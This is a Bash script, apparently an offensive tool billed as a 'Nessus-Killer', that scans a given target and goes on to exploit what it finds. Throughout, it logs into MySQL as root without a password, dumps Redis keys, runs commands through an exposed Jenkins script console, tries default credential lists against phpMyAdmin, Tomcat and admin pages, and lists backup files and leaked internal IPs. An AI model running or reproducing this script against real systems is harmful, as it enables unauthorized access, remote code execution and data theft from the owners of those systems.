#!/bin/bash
# NESSUS KILLER — 10 проверок как у Nessus, но уникально
TARGET=$1
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
OUT="$HOME/shadow_nessus_$(date +%H%M)"
mkdir -p "$OUT"

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — Nessus-Killer Edition      ║"
echo "╚══════════════════════════════════════════════╝"

# 1. SSL/TLS — не просто проверка, а авто-эксплуатация
echo "[1/10] SSL/TLS Hunter..."
nmap --script ssl-poodle,ssl-heartbleed -p 443 "$DOMAIN" 2>/dev/null | grep -q "VULNERABLE" && {
    echo "  🔴 SSL VULNERABLE — dumping certificate info..."
    openssl s_client -connect "$DOMAIN:443" 2>/dev/null | openssl x509 -noout -text > "$OUT/certificate.txt"
    echo "  📁 Cert saved: $OUT/certificate.txt"
}

# 2. SMB — с авто-проверкой EternalBlue
echo "[2/10] SMB Ghost..."
timeout 2 bash -c "echo >/dev/tcp/$DOMAIN/445" 2>/dev/null && {
    echo "  🔴 SMB OPEN"
    # Пробуем анонимный вход
    smbclient -L "//$DOMAIN" -N 2>/dev/null > "$OUT/smb_share.txt"
    [ -s "$OUT/smb_share.txt" ] && echo "  🔴 ANONYMOUS SMB ACCESS!" || echo "  🟡 Auth required"
}

# 3. RDP — детект BlueKeep
echo "[3/10] RDP Hunter..."
timeout 2 bash -c "echo >/dev/tcp/$DOMAIN/3389" 2>/dev/null && {
    echo "  🔴 RDP OPEN"
    # Определяем версию RDP по баннеру
    timeout 3 nc -w2 "$DOMAIN" 3389 2>/dev/null | xxd | head -3 > "$OUT/rdp_banner.txt"
    grep -qi "0300000b" "$OUT/rdp_banner.txt" && echo "  🔴 RDP PRE-AUTH — BlueKeep candidate!"
}

# 4. MySQL — проверка анонимного доступа
echo "[4/10] MySQL Hunter..."
timeout 2 bash -c "echo >/dev/tcp/$DOMAIN/3306" 2>/dev/null && {
    echo "  🟡 MySQL OPEN"
    mysql -h "$DOMAIN" -u root --skip-password -e "SHOW DATABASES;" 2>/dev/null > "$OUT/mysql_dbs.txt"
    [ -s "$OUT/mysql_dbs.txt" ] && echo "  🔴 MySQL NO PASSWORD!" && cat "$OUT/mysql_dbs.txt"
}

# 5. Redis — чтение данных без пароля
echo "[5/10] Redis Hunter..."
timeout 2 bash -c "echo >/dev/tcp/$DOMAIN/6379" 2>/dev/null && {
    echo "  🟡 Redis OPEN"
    (echo "INFO"; sleep 1) | timeout 3 nc "$DOMAIN" 6379 2>/dev/null > "$OUT/redis_info.txt"
    grep -qi "redis_version" "$OUT/redis_info.txt" && echo "  🔴 Redis NO AUTH — reading keys..." && \
    (echo "KEYS *"; sleep 1) | timeout 3 nc "$DOMAIN" 6379 2>/dev/null >> "$OUT/redis_info.txt"
}

# 6. Jenkins — авто-эксплуатация script console
echo "[6/10] Jenkins Hunter..."
for path in /jenkins /jenkins/script; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$path" 2>/dev/null)
    [ "$CODE" = "200" ] && echo "  🔴 Jenkins: $path" && \
    curl -sk --max-time 5 "$TARGET/jenkins/script" -d "script=println 'whoami'.execute().text" 2>/dev/null > "$OUT/jenkins_exec.txt"
done

# 7. phpMyAdmin — брутфорс одним запросом
echo "[7/10] phpMyAdmin Hunter..."
for p in /phpmyadmin /phpMyAdmin /pma; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$p" 2>/dev/null)
    [ "$CODE" = "200" ] && {
        echo "  🔴 phpMyAdmin: $p"
        # Пробуем 5 дефолтных пар
        for cred in "root:" "admin:admin" "root:root" "admin:" "root:password"; do
            curl -sk -u "$cred" --max-time 5 "$TARGET$p" -o /dev/null -w "  $cred → HTTP %{http_code}\n" 2>/dev/null
        done | grep "200" && echo "  🔴 DEFAULT CREDS WORKING!"
    }
done

# 8. Заголовки — не просто проверка, а поиск внутренних IP
echo "[8/10] Header Forensics..."
HEADERS=$(curl -sk -I --max-time 10 "$TARGET" 2>/dev/null)
echo "$HEADERS" | grep -oP '(?:10\.|172\.16\.|192\.168\.)\d+\.\d+' | sort -u | while read ip; do
    echo "  🔴 INTERNAL IP LEAKED: $ip"
    echo "$ip" >> "$OUT/internal_ips.txt"
done

# 9. Directory listing — поиск бэкапов
echo "[9/10] Backup Hunter..."
for d in /uploads /backup /files /dump /export; do
    RESP=$(curl -sk --max-time 5 "$TARGET$d" 2>/dev/null)
    echo "$RESP" | grep -qi "Index of" && {
        echo "  🔴 Directory listing: $d"
        # Ищем файлы бэкапов
        curl -sk --max-time 10 "$TARGET$d" 2>/dev/null | grep -oP 'href="\K[^"]+' | grep -E "\.sql|\.zip|\.tar|\.bak" | while read f; do
            echo "  💰 Backup file: $d/$f"
        done
    }
done

# 10. Дефолтные креды — умный брутфорс
echo "[10/10] Default Creds Hunter..."
# Собираем баннеры и подбираем креды под технологию
SERVER=$(curl -sk -I --max-time 10 "$TARGET" 2>/dev/null | grep -i "Server:" | head -1)

if echo "$SERVER" | grep -qi "Tomcat"; then
    CREDS=("admin:admin" "tomcat:tomcat" "admin:password" "root:root")
    URL="$TARGET/manager/html"
elif echo "$SERVER" | grep -qi "nginx\|Apache"; then
    CREDS=("admin:admin" "admin:password" "user:password")
    URL="$TARGET/admin"
else
    CREDS=("admin:admin" "admin:password" "root:root" "admin:123456")
    URL="$TARGET/login"
fi

for cred in "${CREDS[@]}"; do
    user="${cred%%:*}"
    pass="${cred##*:}"
    CODE=$(curl -sk -u "$user:$pass" -o /dev/null -w "%{http_code}" --max-time 5 "$URL" 2>/dev/null)
    [ "$CODE" = "200" ] || [ "$CODE" = "302" ] && echo "  🔴 DEFAULT CREDS: $cred @ $URL [HTTP $CODE]"
done

echo ""
echo "╔══════════════════════════════════════════════╗"
echo "║   ✅ NESSUS-KILLER COMPLETE                  ║"
echo "║   Report: $OUT                               ║"
echo "╚══════════════════════════════════════════════╝"
